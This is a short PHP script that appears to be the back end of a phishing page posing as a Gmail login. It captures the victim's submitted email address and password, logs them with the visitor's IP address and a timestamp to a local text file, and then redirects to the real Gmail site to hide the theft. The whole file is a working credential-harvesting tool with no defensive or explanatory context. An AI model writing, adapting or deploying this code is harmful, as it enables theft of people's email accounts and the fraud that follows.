<?php
session_start();
$_SESSION['Email'] = $_POST['Email'];
$date = gmdate("d-n-Y");
$time = gmdate("H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$message = "Gmail Login ~# ";
$message .= "User: ".$_POST['Email']."";
$message .= " | Pass: ".$_POST['Passwd']."";
$message .= " | IP: ".$ip." | Time: $time / $date\n";
file_put_contents("logs.txt", $message, FILE_APPEND);
header("Location: https://mail.google.com/");
?>
